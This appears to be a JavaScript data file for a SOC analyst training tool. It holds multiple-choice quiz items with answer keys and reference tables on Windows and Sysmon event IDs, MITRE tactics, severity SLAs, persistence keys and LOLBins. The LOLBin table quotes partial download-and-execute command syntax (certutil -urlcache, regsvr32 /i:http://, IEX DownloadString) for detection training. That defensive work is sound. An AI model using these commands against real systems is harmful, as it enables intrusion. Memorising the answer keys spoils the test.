    o: ["A DNS request", "A legal compliance tool", "An EDR heartbeat", "A C2 check-in with a randomized delay to evade fixed-interval detection"], a: 3, tag: "Network",
    e: "Jitter breaks the 60s-pattern signature. Look for near-regular intervals with small variation instead." },
  { q: "NetFlow / IPFIX records show:",
    o: ["Full packet payloads", "Conversation metadata (5-tuple, bytes, duration) — not full payloads", "Decrypted HTTPS", "User passwords"], a: 1, tag: "Network",
    e: "Flow data answers who-talks-to-whom-at-what-volume; it never sees payload. Use it for beaconing/exfil sizing." },
  { q: "Outbound traffic from a web server to an external MSSQL port (1433) is:",
    o: ["Suspicious — MSSQL to the internet is rarely legitimate", "Only suspicious on Linux", "Fine if it is UDP", "Normal — everyone does this"], a: 0, tag: "Network",
    e: "Database ports outbound to random internet IPs suggest exfil or RAT staging (T1041)." },
  { q: "An NDR (Network Detection and Response) tool detects:",
    o: ["Only WiFi issues", "Only firewall configs", "Endpoint malware execution", "Network-based threats via packet/flow analysis and ML"], a: 3, tag: "Network",
    e: "NDR inspects traffic for beaconing, DGA, tunneling, and payload anomalies without endpoint agents." },
  { q: "Port scanning originating from an internal host typically means:",
    o: ["Normal backup activity", "Email scanning", "A compromised host doing reconnaissance", "A VPN issue"], a: 2, tag: "Network",
    e: "Scanning from a trusted host is a huge red flag for compromise + recon (T1046)." },
  { q: "Without TLS decryption, HTTPS traffic visibility is limited to:",
    o: ["IPs, ports, SNI, TLS fingerprints, and connection metadata", "HTTP headers", "Response bodies", "The full URL and query string"], a: 0, tag: "Network",
    e: "Encrypted = metadata only. JA3 + SNI + timing analysis is how you still detect C2." },
  { q: "Cross-Site Scripting (XSS) is best detected by looking for:",
    o: ["Large downloads", "<script> tags or encoded JS in requests/responses", "Very long passwords", "UNION SELECT"], a: 1, tag: "Web",
    e: "XSS = reflected/stored JS. Look for <script>, onload=, javascript: and base64-encoded payloads (T1059.007)." },
  { q: "An IDOR / BOLA vulnerability lets an attacker:",
    o: ["Infect the server", "Steal an MFA token", "Clear logs", "Access another user's objects by changing an identifier (account=1234)"], a: 3, tag: "Web",
    e: "BOLA = broken object-level authorization. Fuzzing IDs and hitting 200s on other users' objects confirms it." },
  { q: "Server-Side Request Forgery (SSRF) allows an attacker to:",
    o: ["Spoof their client IP", "Guess passwords", "Make the server fetch internal resources on their behalf", "Resolve domains"], a: 2, tag: "Web",
    e: "SSRF = server-side requests to internal IPs/metadata (e.g. 169.254.169.254 cloud metadata). Look for URL params fetching odd hosts." },
  { q: "Which response header blocks clickjacking (page framing)?",
    o: ["X-Powered-By", "Server", "X-Frame-Options / CSP frame-ancestors", "Strict-Transport-Security"], a: 2, tag: "Web",
    e: "Frame-ancestors (CSP) and X-Frame-Options stop the page from being embedded in attacker sites." },
  { q: "A request containing \"UNION SELECT ... FROM information_schema\" indicates:",
    o: ["CSRF", "SQL injection", "A normal health check", "XSS"], a: 1, tag: "Web",
    e: "information_schema queries are classic SQLi schema enumeration (T1190 / injection)." },
  { q: "CSRF attacks rely on:",
    o: ["The victim's browser sending an authenticated request unknowingly", "A compromised certificate", "Brute-forcing passwords", "SQL injection"], a: 0, tag: "Web",
    e: "CSRF = the user's session is abused to make state-changing requests. Detect via missing CSRF tokens on forms." },
  { q: "An HTTP 500 after an attacker's SQLi payload suggests:",
    o: ["The server is offline", "A network issue", "The attack failed and is harmless", "The query may have executed and crashed — investigate further"], a: 3, tag: "Web",
    e: "A crash after a payload often means the injection partially worked. Check the app/database logs." },
  { q: "On Linux, which file holds password hashes (root-only)?",
    o: ["/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/resolv.conf"], a: 1, tag: "Linux",
    e: "/etc/shadow = hashes (root). Reading it = hash dump attempt (T1003.008)." },
  { q: "A cron job running /tmp/xmrig every minute indicates:",
    o: ["Package updates", "Log rotation", "A legitimate backup", "Crypto-mining persistence"], a: 3, tag: "Linux",
    e: "/tmp binaries + cron = miner persistence (T1053.003 + T1496)." },
  { q: "sshd logs authentication failures to:",
    o: ["/var/log/nginx/access.log", "/var/log/kern.log", "/var/log/auth.log (or /var/log/secure)", "/var/log/dmesg"], a: 2, tag: "Linux",
    e: "auth.log captures 'Failed password' bursts and 'Accepted' events — the SSH brute-force ground truth." },
  { q: "A new entry in ~/.ssh/authorized_keys is a sign of:",
    o: ["Persistence via a backdoor SSH key", "Disk cleanup", "SSH server patching", "Normal user activity"], a: 0, tag: "Linux",
    e: "Appended keys give the attacker permanent passwordless access (T1098.004)." },
  { q: "Which command lists running processes on Linux?",
    o: ["regedit", "ipconfig", "dir", "ps aux / top"], a: 3, tag: "Linux",
    e: "ps/top show process state — the analog of Sysmon EID 1 for triage." },
  { q: "High CPU plus outbound connections to port 3333 (mining pools) indicates:",
    o: ["A web server", "Resource hijacking (crypto mining)", "An SSH tunnel", "A DNS server"], a: 1, tag: "Linux",
    e: "3333 = common Monero/XMRig pool port. High CPU + pool conns = T1496." },
  { q: "In Azure/Entra ID, which log best captures sign-in anomalies (impossible travel, MFA failure)?",
    o: ["Sign-in logs (Interactive user sign-ins)", "VNet flow logs", "Storage access logs", "Azure activity log"], a: 0, tag: "Cloud",
    e: "Entra ID sign-in logs record location, device, MFA result, and risk — the identity SOC's primary feed." },
  { q: "An AWS access key starting with AKIA pasted in a public repo is:",
    o: ["An instance role", "A harmless test key", "A leaked long-term credential — revoke and rotate", "A session token"], a: 2, tag: "Cloud",
    e: "AKIA = permanent access key ID. ASIA = temporary session token (lower risk). Leaked AKIA = immediate revoke." },
  { q: "An OAuth app requesting 'Mail.Read' for a user's mailbox is:",
    o: ["Impossible", "Only possible on Linux", "Always safe", "A common consent-phishing / exfiltration primitive"], a: 3, tag: "Cloud",
    e: "Consent grants are the #1 cloud phishing vector — attackers get mailbox/OneDrive via one click (T1566 + T1048)." },
  { q: "Conditional Access policies in Entra ID allow you to:",
    o: ["Change passwords", "Configure DNS", "Enforce MFA on risky sign-ins and block legacy auth", "Patch servers"], a: 2, tag: "Cloud",
    e: "Conditional Access = the main control plane for risky/legacy-auth sign-ins in the cloud." },
  { q: "A service principal performing mass password writes is:",
    o: ["Suspicious — investigate (credential-stuffing vector)", "The weekly backup", "Normal scheduled maintenance", "A DNS update"], a: 0, tag: "Cloud",
    e: "Mass password set (T1110) from an identity app = account-takeover/credential-stuffing campaign. Investigate immediately." },
  { q: "An S3 bucket policy changed to public followed by large downloads is:",
    o: ["A compliance audit", "Data exposure / exfiltration via cloud storage", "Normal operations", "A CDN pre-warm"], a: 1, tag: "Cloud",
    e: "Public bucket + big egress = leak/exfil (T1530). Check CloudTrail for the policy change actor." },
  { q: "Event ID 4776 is generated for:",
    o: ["A Kerberos TGT request", "NTLM authentication attempt validated by a domain controller", "A scheduled task creation", "A group membership change"], a: 1, tag: "Events",
    e: "4776 = NTLM authentication attempt (DC). Useful for spotting NTLM usage where Kerberos is expected, and for Pass-the-Hash visibility." },
  { q: "Event ID 4634 differs from 4647 in that:",
    o: ["They are identical", "4634 only applies to RDP sessions", "4634 is any logoff (including forced/session end); 4647 is a user-initiated logoff", "4634 is a logon; 4647 is a logoff"], a: 2, tag: "Events",
    e: "4634 = Logoff (any reason). 4647 = User Initiated Logoff specifically — useful to distinguish a clean sign-out from a forced/killed session." },
  { q: "Event ID 4699 records:",
    o: ["A service was installed", "A scheduled task was deleted", "An account was locked out", "A scheduled task was created"], a: 1, tag: "Events",
    e: "4699 = Scheduled Task Deleted — attackers sometimes delete their persistence task after use as anti-forensics; correlate with a prior 4698." },
  { q: "A newly created user account is logged with Event ID:",
    o: ["4724", "4738", "4720", "4722"], a: 2, tag: "Events",
    e: "4720 = User Account Created. Baseline expected account-creation processes so unexpected 4720s (off-hours, non-IT actor) stand out." },
  { q: "PowerShell Event ID 4103 (Module Logging) differs from 4104 in that:",
    o: ["4103 and 4104 are the same event", "4103 logs which modules/cmdlets were used; 4104 captures the full (often decoded) script block content", "4103 is for Sysmon; 4104 is for Security log", "4103 only fires on Windows Server"], a: 1, tag: "Events",
    e: "4104 Script Block Logging is the higher-value event for detecting obfuscated/encoded PowerShell, since it reconstructs the actual code executed." },
  { q: "Event ID 1074 logs:",
    o: ["A user logon", "A password reset", "A file deletion", "A system shutdown or restart was initiated"], a: 3, tag: "Events",
    e: "1074 = System shutdown/restart initiated, with the user and reason code. Unexpected reboots can indicate anti-forensics or a destructive action (e.g. ransomware)." },
  { q: "Event ID 4662 is most associated with detecting:",
    o: ["A local logon", "A firewall rule change", "DCSync-style directory replication abuse", "A DNS query"], a: 2, tag: "Events",
    e: "4662 (an operation was performed on an object) with the Directory Replication Service GUIDs is the classic indicator of DCSync credential theft (T1003.006)." },
  { q: "On a 4625 failure, SubStatus 0xC0000234 means:",
    o: ["Account disabled", "Account locked out", "Wrong password", "Password expired"], a: 1, tag: "Events",
    e: "0xC0000234 = STATUS_ACCOUNT_LOCKED_OUT — distinct from 0xC000006A (wrong password); a burst of these suggests a prior brute force triggered a lockout policy." }
];

const REFERENCE = [
  {
    id: "events", title: "Windows Security Event IDs",
    sections: [
      { h: "Authentication & Logon", headers: ["ID", "Name", "Why it matters"],
        rows: [
          ["4624", "Successful Logon", "Primary logon visibility. Track who, where, how."],
          ["4625", "Failed Logon", "Brute force, password spray, credential stuffing."],
          ["4672", "Special Logon (Privileged)", "Admin logon. SeDebug, SeTcb, SeBackup privileges."],
          ["4768", "Kerberos TGT Request (AS-REQ)", "Kerberos auth start; user → KDC."],
          ["4769", "Kerberos Service Ticket (TGS-REQ)", "Service access. Kerberoasting if RC4 (0x17)."],
          ["4771", "Kerberos Pre-Auth Failed", "AS-REP roasting, Kerberos password spray."],
          ["4776", "NTLM Auth Attempt (DC)", "NTLM auth; Pass-the-Hash visibility."]
        ] },
      { h: "Process & Execution", headers: ["ID", "Name", "Why it matters"],
        rows: [
          ["4688", "Process Creation", "Process execution + command line (if GPO enabled)."],
          ["4698", "Scheduled Task Created", "Persistence. Check Author, Command, Trigger."],
          ["4699", "Scheduled Task Deleted", "Covering tracks."],
          ["4700", "Scheduled Task Enabled", "Persistence activation."]
        ] },
      { h: "Account Management", headers: ["ID", "Name", "Why it matters"],
        rows: [
          ["4720", "User Account Created", "New account creation - backdoor account."],
          ["4723", "Password Change Attempt", "Self-service vs admin reset."],
          ["4724", "Password Reset Attempt", "Admin reset - potential compromise."],
          ["4728", "User Added to Global Group", "Privilege escalation (e.g., Domain Admins)."],
          ["4732", "User Added to Domain Local Group", "Local admin / RDP access grants."]
        ] },
      { h: "Policy, Audit & Services", headers: ["ID", "Name", "Why it matters"],
        rows: [
          ["1102", "Audit Log Cleared", "Anti-forensics. Investigate immediately."],
          ["4719", "Audit Policy Changed", "Logging tampering / evasion."],
          ["4902", "Per-User Audit Policy Changed", "Targeted logging evasion."],
          ["7045", "Service Installed", "Persistence. Check path + account + name."],
          ["7036", "Service State Change", "Unusual services starting."]
        ] }
    ]
  },
  {
    id: "logon-types", title: "Logon Types (Event 4624)",
    sections: [
      { h: "The 11 logon types", headers: ["Type", "Name", "Description", "Suspicious if"],
        rows: [
          ["2", "Interactive", "Local console (keyboard)", "On a server, at 3AM, from admin"],
          ["3", "Network", "SMB, RPC, WinRM", "Service accounts, lateral movement"],
          ["4", "Batch", "Scheduled task", "Non-service account, unusual time"],
          ["5", "Service", "Service startup", "Non-service account, new service"],
          ["7", "Unlock", "Workstation unlock", "Rapid lock/unlock"],
          ["8", "NetworkCleartext", "IIS basic auth, FTP", "Credentials in cleartext"],
          ["9", "NewCredentials", "RunAs /netonly", "Lateral movement, credential theft"],
          ["10", "RemoteInteractive", "RDP", "External IP, impossible travel, admin"],
          ["11", "CachedInteractive", "Offline logon", "Laptop off-domain, cached creds"]
        ] }
    ]
  },
  {
    id: "failure-codes", title: "4625 Status / Failure Codes",
    sections: [
      { h: "Key codes", headers: ["Code", "Meaning", "Attack indicator"],
        rows: [
          ["0xC000006A", "Wrong password", "Brute force, password spray"],
          ["0xC000006D", "Bad username", "User enumeration"],
          ["0xC000006F", "Logon time restriction", "Policy violation"],
          ["0xC0000070", "Workstation restriction", "Unauthorized device"],
          ["0xC0000072", "Account disabled", "Targeting disabled accounts"],
          ["0xC000015B", "Smartcard required", "MFA bypass attempt"],
          ["0xC000019B", "Account locked out", "Brute force → lockout"],
          ["0xC0000224", "Password must change", "Forced reset"],
          ["0xC00002EE", "Account not found", "User enumeration"]
        ] }
    ]
  },
  {
    id: "sysmon", title: "Sysmon Event IDs",
    sections: [
      { h: "All 26 Event IDs", headers: ["EID", "Name", "Key use"],
        rows: [
          ["1", "Process Create", "Full cmdline, parent, hashes (crown jewel)"],
          ["2", "File Creation Time Change", "Timestomping"],
          ["3", "Network Connection", "Outbound/inbound per process"],
          ["4", "Service State Change", "Service install/start"],
          ["5", "Process Terminate", "Process exit"],
          ["6", "Driver Load", "Kernel driver load"],
          ["7", "Image Load", "DLL/EXE load (unsigned = suspicious)"],
          ["8", "CreateRemoteThread", "Cross-process injection (T1055)"],
          ["9", "RawAccessRead", "Raw disk access (NTDS.dit)"],
          ["10", "ProcessAccess", "OpenProcess w/ rights - LSASS dump"],
          ["11", "File Create", "Malware drops, staging"],
          ["12", "Registry Create/Delete", "Persistence keys"],
          ["13", "Registry Value Set", "Run keys, service config"],
          ["14", "Registry Key Rename", "Rare"],
          ["15", "File Create Stream Hash", "Alternate Data Streams"],
          ["17", "Pipe Created", "Named pipes (Cobalt Strike)"],
          ["18", "Pipe Connected", "Pipe client connections"],
          ["19", "WMI Event Filter", "Persistence (T1546.003)"],
          ["20", "WMI Event Consumer", "Persistence (T1546.003)"],
          ["21", "WMI Filter-Consumer Binding", "Persistence (T1546.003)"],
          ["22", "DNS Query", "DGA, tunneling, C2 domains"],
          ["23", "File Delete", "Covering tracks"],
          ["24", "Clipboard Change", "Clipboard theft"],
          ["25", "Process Tampering", "Process hollowing/herpaderping"],
          ["26", "File Delete Detected", "Archive via USN"]
        ] },
      { h: "LSASS access rights (EID 10)", headers: ["Hex", "Right", "Attack"],
        rows: [
          ["0x1FFFFF", "PROCESS_ALL_ACCESS", "Full control / dump"],
          ["0x001F0FFF", "VM_READ/WRITE + standard", "Memory read/write"],
          ["0x00001000", "PROCESS_VM_READ", "LSASS memory read → dump"],
          ["0x00000020", "PROCESS_VM_WRITE", "Memory write → injection"],
          ["0x00000100", "PROCESS_CREATE_THREAD", "Remote thread injection"]
        ] }
    ]
  },
  {
    id: "mitre", title: "MITRE ATT&CK — 14 Tactics",
    sections: [
      { h: "Enterprise tactics in attack order", headers: ["#", "Tactic", "ID", "Example techniques"],
        rows: [
          ["1", "Reconnaissance", "TA0043", "T1590 Active Scanning, T1598 Phishing for Info"],
          ["2", "Resource Development", "TA0042", "T1583 Acquire Infrastructure"],
          ["3", "Initial Access", "TA0001", "T1566 Phishing, T1190 Exploit Public App, T1078 Valid Accounts"],
          ["4", "Execution", "TA0002", "T1059 PowerShell, T1204 User Execution, T1053 Scheduled Task"],
          ["5", "Persistence", "TA0003", "T1547 Run Keys, T1053 Task, T1543 Service, T1546 WMI"],
          ["6", "Privilege Escalation", "TA0004", "T1068 Exploit, T1134 Token Manip, T1548 UAC Bypass"],
          ["7", "Defense Evasion", "TA0005", "T1055 Injection, T1036 Masquerade, T1562 Disable Tools"],
          ["8", "Credential Access", "TA0006", "T1003.001 LSASS, T1558 Kerberos, T1550 Alt Auth"],
          ["9", "Discovery", "TA0007", "T1082 System Info, T1018 Remote Systems, T1087 Accounts"],
          ["10", "Lateral Movement", "TA0008", "T1021 RDP/SMB/WinRM, T1550 Alt Auth, T1570 Tool Transfer"],
          ["11", "Collection", "TA0009", "T1005 Local Data, T1039 Shares, T1114 Email"],
          ["12", "Command & Control", "TA0011", "T1071 App Protocol, T1090 Proxy, T1573 Encrypted Channel"],
          ["13", "Exfiltration", "TA0010", "T1567 Web Service, T1041 C2 Channel, T1048 Alt Protocol"],
          ["14", "Impact", "TA0040", "T1486 Data Encrypted, T1485 Destruction, T1490 Recovery Inhibit"]
        ] },
      { h: "Crown-jewel techniques for L1", headers: ["Technique", "ID", "What to look for"],
        rows: [
          ["LSASS Memory Dump", "T1003.001", "Sysmon EID 10: lsass + VM_READ (0x1010)"],
          ["Kerberoasting", "T1558.003", "4769 RC4 (0x17) burst for SPNs"],
          ["Process Injection", "T1055", "Sysmon EID 8, EID 10 write, EID 25"],
          ["Registry Run Keys", "T1547.001", "Sysmon EID 12/13 Run/RunOnce"],
          ["Clear Logs", "T1070.001", "Event 1102"],
          ["DGA", "T1568.002", "High entropy, NXDOMAIN volume"]
        ] }
    ]
  },
  {
    id: "severity", title: "Severity, Priority & SLAs",
    sections: [
      { h: "Severity definitions", headers: ["Level", "Definition", "SLA (ack / contain)"],
        rows: [
          ["P1", "Active breach NOW: ransomware, exfil, DC compromise, DA compromise, worm, active C2 commands, critical vuln exploited on internet-facing asset", "15 min / 1 hr"],
          ["P2", "Compromise likely, foothold: malware+C2, brute force on privileged, impossible travel, lateral movement, persistence, credential dumping, phish+login", "30 min / 4 hrs"],
          ["P3", "Suspicious, not confirmed: encoded PowerShell, single logon anomaly, LOLBin/unsigned script, new binary, suspicious domain conn, phishing delivered (no click)", "2 hrs / 24 hrs"],
          ["P4", "Baseline deviation: policy violation, isolated failed login, blocked port scan, expired cert, TI hit on historical log", "8 hrs / batch"]
        ] },
      { h: "Priority matrix (Severity × Asset Tier)", headers: ["Asset", "P1 sev", "P2 sev", "P3 sev", "P4 sev"],
        rows: [
          ["Tier 0 (DC, PKI, PAM)", "P1", "P1", "P2", "P3"],
          ["Tier 1 (critical apps, DB, file, VPN)", "P1", "P2", "P3", "P4"],
          ["Tier 2 (standard servers/workstations)", "P2", "P3", "P4", "P4"],
          ["Tier 3 (test, dev, IoT, kiosk)", "P3", "P4", "P4", "P4"]
        ] },
      { h: "Triage time budget (Module 2)", headers: ["Alert type", "Target", "Max"],
        rows: [
          ["P1 / Critical", "5-10 min", "15 min"],
          ["P2 / High", "10-20 min", "30 min"],
          ["P3 / Medium", "20-30 min", "45 min"],
          ["P4 / Low", "Batch review", "60 min"]
        ] }
    ]
  },
  {
    id: "persistence", title: "Persistence Registry Keys",
    sections: [
      { h: "Keys to monitor (Sysmon EID 12/13)", headers: ["Key", "Technique"],
        rows: [
          ["HKLM\\SOFTWARE\\...\\CurrentVersion\\Run / RunOnce", "T1547.001 Run keys"],
          ["HKCU\\SOFTWARE\\...\\CurrentVersion\\Run / RunOnce", "T1547.001 Run keys"],
          ["HKLM\\...\\Policies\\Explorer\\Run", "T1547.001 Policy run"],
          ["HKLM\\SYSTEM\\CurrentControlSet\\Services\\*", "T1543.003 Service persistence"],
          ["HKLM\\...\\Winlogon\\Userinit / Shell", "T1547.004 Winlogon"],
          ["HKLM\\...\\Explorer\\Browser Helper Objects", "T1547.001 BHO"],
          ["HKLM\\...\\Session Manager\\KnownDLLs", "T1574 DLL hijacking"],
          ["HKLM\\SOFTWARE\\Classes\\CLSID\\...\\InprocServer32", "T1546.015 COM hijack"]
        ] },
      { h: "Suspicious process patterns", headers: ["Pattern", "Meaning"],
        rows: [
          ["Office → script (WINWORD → powershell -enc)", "Phishing / macro (T1566 → T1059.001)"],
          ["Script → script (nested PS)", "Obfuscation / staging"],
          ["SERVICES.EXE → powershell", "Service exploit"],
          ["LOLBins: rundll32, regsvr32, mshta, certutil + remote arg", "Living-off-the-land (T1218)"],
          ["High integrity child from Medium parent", "UAC bypass (T1548.002)"],
          ["Unsigned binary in Temp/AppData", "Malware drop"]
        ] }
    ]
  },
  {
    id: "correlation", title: "Attack Stage → Event Correlation",
    sections: [
      { h: "Which events to correlate per attack stage", headers: ["Attack stage", "Primary events", "Correlate with"],
        rows: [
          ["Initial Access (phishing)", "4688 Office→script, 4104 PS Script Block", "Email logs, proxy, DNS"],
          ["Credential Theft", "4672, 4624 Type 9, 4776 (NTLM)", "4688 LSASS access, 4663 NTDS.dit"],
          ["Lateral Movement", "4624 Type 3/10, 4688 PsExec/WMI, 4698 remote task", "NDR SMB/RPC, 4769"],
          ["Persistence", "4698 task, 7045 service, 4657/12/13 Run keys", "4688 execution"],
          ["Privilege Escalation", "4672, 4688 token manip", "4728/4732 group add, 4719 audit policy"],
          ["Defense Evasion", "1102 log clear, 4719 audit change", "4663 AV config, EDR tamper"],
          ["Exfiltration", "4663 file read, 5156 network connect", "NDR large transfer, proxy, cloud logs"]
        ] }
    ]
  },
  {
    id: "lolbins", title: "LOLBins — Living off the Land",
    sections: [
      { h: "Legitimate Windows binaries abused by attackers (T1218)", headers: ["Binary", "Legit use", "Abuse / TTP", "Detection"],
        rows: [
          ["powershell.exe", "Scripting, admin tasks", "PowerShell (T1059.001): -enc payloads, IEX, DownloadString C2", "EID 4104 Script Block Log, 4688 cmdline"],
          ["certutil.exe", "Certificate / checksum tool", "Download file (T1105): certutil -urlcache -f http://...", "EID 1 with -urlcache/-split/-decode"],
          ["bitsadmin.exe", "Background transfer (BITS)", "Download C2 payload via BITS (T1197): bitsadmin /transfer", "EID 1 with /transfer, EID 4817/4819"],
          ["mshta.exe", "Run HTA files", "Office → mshta with remote script (T1218.005)", "EID 1: mshta with http:// or javascript:"],
          ["rundll32.exe", "Load DLLs / DLL entry points", "Execution (T1218.011): rundll32 javascript:, mshta alias, DLL side-load", "EID 1 with javascript: / http: args"],
          ["regsvr32.exe", "Register COM/DLL", "Squiblydoo (T1218.010): regsvr32 /s /n /u /i:http:// scrobj.dll", "EID 1 with /i:http://, network conn"],
          ["wscript.exe / cscript.exe", "Run VBS/JS scripts", "Macro drop → .vbs/.js execution, obfuscated scripts", "EID 1: cscript/wscript child of Office"],
          ["msiexec.exe", "MSI installer", "Remote MSI install / persistence (T1218.007)", "EID 1: msiexec /i http:// /quiet"],
          ["cmstp.exe", "Connection Manager profile", "InfInstall (T1218.003): remote .inf install", "EID 1 with .inf over network share"],
          ["odbcconf.exe", "ODBC driver config", "Sideloading .dll / execute command (T1218.008)", "EID 1 with /a {dll} /f"],
          ["wmic.exe", "WMI command line", "Execution (T1047): wmic process call create, kill AV", "EID 1 with process call create"],
          ["forfiles.exe", "Run command on files", "Bypass execution constraints (T1202)", "EID 1: forfiles /c cmd /c"],
          ["schtasks.exe", "Create scheduled tasks", "Persistence (T1053.005): task with hidden flags /register", "EID 4698, 106"],
          ["wsl.exe", "Linux on Windows", "Run Linux tooling to bypass AV (T1202)", "EID 1 with wsl + bash -c"]
        ] },
      { h: "LOLBin parent→child red flags", headers: ["Chain", "Typical meaning"],
        rows: [
          ["OUTLOOK → powershell / wscript", "Phishing macro (T1566 → T1059.001)"],
          ["WINWORD → mshta / rundll32 / regsvr32", "Office → LOLBin download-and-exec"],
          ["rundll32 → cmd / powershell", "DLL side-loading / proxy execution"],
          ["Any LOLBin with http:// / javascript: / base64 arg", "Remote payload fetch (T1105)"],
          ["certutil / bitsadmin first run on clean machine", "Staging — pull the full command line"]
        ] }
    ]
  }
];



